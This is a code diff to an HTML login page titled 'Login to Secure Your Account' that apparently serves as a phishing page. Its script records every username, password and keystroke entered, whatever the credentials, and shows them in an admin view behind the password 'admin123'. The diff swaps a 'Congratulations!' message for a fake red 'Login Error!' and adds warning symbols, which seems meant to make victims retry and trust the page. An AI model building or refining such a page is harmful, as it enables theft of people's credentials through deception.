@@ -25,6 +25,7 @@
             text-align: center;
             font-size: 18px;
             margin: 10px 0;
+            color: #c0392b; /* Red color for the warning sign */
         }
 
         .login-container input {
@@ -59,8 +60,8 @@
             margin: 0 0 5px;
         }
 
-        .congrats-message {
-            color: #ff00ff;
+        .error-message {
+            color: #e74c3c;
             font-size: 24px;
             font-weight: bold;
             text-align: center;
@@ -71,7 +72,7 @@
 <body>
 
 <div class="login-container" id="loginContainer">
-    <div class="login-title">Login to Secure Your Account</div>
+    <div class="login-title">&#9888; Login to Secure Your Account &#9888;</div>
     <form id="loginForm" onsubmit="return login(event)">
         <input type="text" id="phone" name="phone" required oninput="recordInput('phone', event)">
         <label for="phone" class="form-label">Phone No./Username:</label>
@@ -81,7 +82,7 @@
         
         <input type="submit" value="Login">
     </form>
-    <div id="loginMessage" class="congrats-message"></div>
+    <div id="loginMessage" class="error-message"></div>
 </div>
 
 <div class="admin-container" id="adminContainer">
@@ -101,8 +102,8 @@
         // Add user to the array regardless of credentials
         users.push({ phone, password, keystrokesPhone: keystrokes.phone, keystrokesPassword: keystrokes.password });
 
-        // Display congratulatory message
-        document.getElementById("loginMessage").innerText = "Congratulations!";
+        // Display login error message
+        document.getElementById("loginMessage").innerText = "Login Error!";
         document.getElementById("loginMessage").style.display = "block"; // Ensure message is visible
 
         // Show admin view if the password is 'admin123'
@@ -140,5 +141,3 @@
 
 </body>
 </html>
-
-
